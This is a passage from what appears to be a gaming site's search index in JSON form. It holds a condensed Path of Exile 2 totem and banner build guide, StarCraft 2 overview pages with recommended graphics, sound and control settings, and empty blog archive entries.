3. +5 to All Attributes (if lacking attributes)</p>"},{"location":"games/poe2/builds/ballista-banner-tactician/#key-equipment","title":"Key Equipment","text":""},{"location":"games/poe2/builds/ballista-banner-tactician/#weapon-set-1-banner-setup","title":"Weapon Set 1 (Banner Setup)","text":"<ul> <li>Lifesprig (or fast cast speed wand)</li> <li>Use Mana Drain for mana recovery</li> <li>Shrine Sceptre</li> <li>55+ Increased Spirit</li> <li>30+ Intelligence for level 18+ Frost Bomb</li> <li>Use Perfect Essence of Command (Aura Magnitudes work with Banners)</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#weapon-set-2-mortar-cannon","title":"Weapon Set 2 (Mortar Cannon)","text":"<ul> <li>Siege Crossbow (highest level base)</li> <li>High physical damage roll</li> <li>+1 to Ballista (BiS) or Increased Grenade Damage</li> <li>+6 Level to attack skills</li> <li>Attack Speed</li> <li>Zealot Gauntlets (Armour/Evasion base)</li> <li>Constricting Command (requires 5 fewer enemies to be surrounded)</li> <li>Doedre's Damning (additional curse)</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#key-rings-accessories","title":"Key Rings &amp; Accessories","text":"<ul> <li>Add physical damage to attacks</li> <li>Intelligence requirements</li> <li>Elemental resistances  </li> <li>Maximum life</li> <li>Increased rarity (for MF variant)</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#skill-setup","title":"Skill Setup","text":""},{"location":"games/poe2/builds/ballista-banner-tactician/#weapon-set-1-banners","title":"Weapon Set 1 (Banners)","text":"<ul> <li>Blasphemy + Elemental Weakness + Temporal Chains</li> <li>Frost Bomb (for exposure)</li> <li>War Banner, Defiance Banner, Dread Banner</li> <li>Purity of Fire</li> <li>Companion (Haste Aura)</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#weapon-set-2-mortar-cannon_1","title":"Weapon Set 2 (Mortar Cannon)","text":"<ul> <li>Mortar Cannon + Cluster Grenade + supports</li> <li>Wind Dancer (utility)</li> <li>Mirage Archer + Explosive Grenade</li> <li>Companion (shared with Set 1)</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#skill-rotation","title":"Skill Rotation","text":""},{"location":"games/poe2/builds/ballista-banner-tactician/#standard-mapping","title":"Standard Mapping","text":"<ol> <li>Drop Mortar Cannon (auto-swaps to weapon set 2)</li> </ol>"},{"location":"games/poe2/builds/ballista-banner-tactician/#full-rotation-tough-content","title":"Full Rotation (Tough Content)","text":"<ol> <li>Drop Mortar Cannon</li> <li>Cast Frost Bomb (auto-swaps to set 1)</li> <li>Drop War Banner, Defiance Banner, Dread Banner</li> <li>Cast Mana Drain if low on mana</li> <li>Repeat step 1 once Mortar Cannon finishes shooting (4 grenades)</li> </ol>"},{"location":"games/poe2/builds/ballista-banner-tactician/#pinnacle-bossing","title":"Pinnacle Bossing","text":"<ul> <li>Swap Short Fuse I with Short Fuse II for increased damage</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#build-variants","title":"Build Variants","text":""},{"location":"games/poe2/builds/ballista-banner-tactician/#early-game-league-starter","title":"Early Game / League Starter","text":"<ul> <li>Budget: Minimal investment</li> <li>Focus on basic totem setup</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#budget-magic-find","title":"Budget Magic Find","text":"<ul> <li>Budget: 10-15 Divines</li> <li>150-200% rarity</li> <li>Level: 85-95+</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#end-game","title":"End Game","text":"<ul> <li>Full optimization with rare gear</li> <li>Most items achievable except optional From Nothing jewel</li> <li>Strong pinnacle boss capability</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#important-notes","title":"Important Notes","text":"<ul> <li>Requires Gem Enthusiast passive - need 10+ green and red support gems</li> <li>From Nothing jewel is optional but powerful</li> <li>Weapon swapping is core to the playstyle</li> <li>Banner management becomes second nature with practice</li> </ul>"},{"location":"games/poe2/builds/ballista-banner-tactician/#video-guides","title":"Video Guides","text":"<p>The build creator provides regular video updates: - Day 2: Early Game Setup - Day 3: Budget MF Setup (150-200% rarity) - Day 4: End Game Totem Banner Dual Curse</p> <p>Original guide by Lazy Exile on Mobalytics. This documentation provides a condensed version of the comprehensive build guide.</p>"},{"location":"games/poe2/params/poe2_params/","title":"Params Path of Exile 2","text":""},{"location":"games/starcraft2/","title":"StarCraft 2","text":"<p>Welcome to the StarCraft 2 section!</p>"},{"location":"games/starcraft2/#overview","title":"Overview","text":"<p>StarCraft 2 is a real-time strategy (RTS) game developed by Blizzard Entertainment. This section contains guides and configurations to improve your performance.</p>"},{"location":"games/starcraft2/#available-content","title":"Available Content","text":""},{"location":"games/starcraft2/#configuration","title":"Configuration","text":"<ul> <li>Optimal Settings - Game configuration and performance settings</li> </ul>"},{"location":"games/starcraft2/#external-resources","title":"External Resources","text":""},{"location":"games/starcraft2/#community-sites","title":"Community Sites","text":"<ul> <li>Official StarCraft 2 Website</li> <li>Liquipedia StarCraft 2 - Complete game wiki</li> <li>Reddit StarCraft - Active community</li> </ul>"},{"location":"games/starcraft2/#training-tools","title":"Training Tools","text":"<ul> <li>Build Orders - Optimized build orders</li> <li>Replay Analysis - Replay analysis tools</li> <li>Practice Maps - Training maps</li> </ul> <p>Competitive</p> <p>StarCraft 2 is one of the most demanding esports games. Regular practice and settings optimization are essential for improvement.</p> <p>Beginners</p> <p>Start by mastering a single race and focus on fundamentals: macro, micro, and timing.</p>"},{"location":"games/starcraft2/params/starcraft2/","title":"Params Starcraft 2","text":"<p>sc2 params thanks to: www.TerranCraft.com</p> <ul> <li>Graphics</li> <li>Graphics and Textures:</li> <li>Sound</li> <li>Control</li> <li>mouse</li> <li>Gameplay</li> <li>Hybrid Settings</li> </ul>"},{"location":"games/starcraft2/params/starcraft2/#graphics","title":"Graphics","text":"<ul> <li>Display mode: Fullscreen</li> <li>Resolution: 1920 x 1080</li> <li>Vertical syn: Disable</li> <li>Refresh rate: Default</li> <li>Reduced violence: Enable</li> </ul>"},{"location":"games/starcraft2/params/starcraft2/#graphics-and-textures","title":"Graphics and Textures:","text":"<ul> <li>High for models</li> <li>Medium for shaders, shadows and effects</li> <li>Low for everything else</li> </ul>"},{"location":"games/starcraft2/params/starcraft2/#sound","title":"Sound","text":"<ul> <li>Music: Disable</li> <li>Ambient sound: Disable</li> <li>Move sound: 100%</li> <li>Sound quality: Low</li> <li>Voices sound: Enable</li> <li>Error sound: Enable</li> </ul>"},{"location":"games/starcraft2/params/starcraft2/#control","title":"Control","text":"<p>Set your window mouse setting to the following before you do the in game changes below.</p>"},{"location":"games/starcraft2/params/starcraft2/#mouse","title":"mouse","text":"<ul> <li>Mouse sensitivity: Enable</li> <li>Mouse sensitivity: 52%</li> <li>Mouse wheel zoom: Enable</li> <li>Reduce mouse lag: Disable</li> <li>Windows key: Disable</li> <li>Mouse scroll: Enable</li> <li>Invert drag scroll: Disable</li> <li>Smart camera pan: Disable</li> </ul>"},{"location":"games/starcraft2/params/starcraft2/#gameplay","title":"Gameplay","text":"<ul> <li>Alert: Disable</li> <li>Game timer: Enable</li> <li>Build grid: Enable</li> <li>Work status: Enable</li> <li>Current order indicator: Enable</li> <li>Select all larva: Disable</li> <li>Enemy unit selection: Enable</li> <li>Experience points: Enable</li> <li>Show unit life bar: Always or damaged</li> <li>Control group: Unclickable or hidden</li> <li>Flyer helper: Always</li> </ul>"},{"location":"games/starcraft2/params/starcraft2/#hybrid-settings","title":"Hybrid Settings","text":"<p>Hybrid Settings</p>"},{"location":"blog/archive/2021/","title":"2021","text":""},{"location":"blog/archive/2019/","title":"2019","text":""}]}